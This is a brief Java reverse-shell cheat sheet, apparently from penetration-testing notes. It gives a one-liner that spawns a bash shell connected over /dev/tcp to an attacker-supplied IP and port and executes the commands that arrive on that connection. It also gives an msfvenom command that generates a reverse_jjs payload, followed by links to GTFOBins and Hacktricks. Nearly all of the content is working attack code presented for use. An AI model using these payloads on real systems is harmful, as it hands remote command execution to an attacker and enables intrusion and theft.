# Java

## 01 - One-liners

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## 02 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_jjs lhost=<IP> lport=<PORT>
```

---
## References

### GTFOBins

- [GTFOBins: jjs](https://gtfobins.github.io/gtfobins/jjs/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)